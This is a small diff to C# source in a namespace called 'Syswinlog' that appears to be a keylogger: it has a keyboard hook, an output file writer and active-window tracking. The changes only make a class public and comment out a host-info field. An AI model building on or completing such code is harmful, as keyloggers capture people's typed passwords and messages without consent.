@@ -43,7 +43,7 @@ namespace Syswinlog
             NativeMethods.UnhookWindowsHookEx(_hookptr);
         }
 
-        class ActiveWindowTextManager
+        public class ActiveWindowTextManager
         {
             private static StringBuilder _activeWindow = new StringBuilder();
             public void Run()
@@ -145,8 +145,7 @@ namespace Syswinlog
         private static bool uppercase;
         private static StreamWriter _outfile;
         private static StringBuilder _currentActiveWindow = new StringBuilder();
-        // information about the current host
-        private static HostInfo hostInfo;
+        //private static HostInfo hostInfo;
         private static ActiveWindowTextManager _activeWindowTextManager;
         public delegate void ActiveWindowCallback();
         #endregion
